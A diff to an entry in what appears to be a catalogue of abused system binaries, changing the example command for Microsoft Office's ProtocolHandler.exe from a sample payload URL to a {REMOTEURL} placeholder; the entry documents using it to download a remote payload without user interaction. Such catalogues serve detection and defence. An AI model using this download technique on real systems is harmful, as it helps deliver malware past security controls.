@@ -4,7 +4,7 @@ Description: Microsoft Office binary
 Author: Nir Chako
 Created: 2022-07-24
 Commands:
-  - Command: ProtocolHandler.exe https://example.com/payload
+  - Command: ProtocolHandler.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: "It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)"
     Category: Download
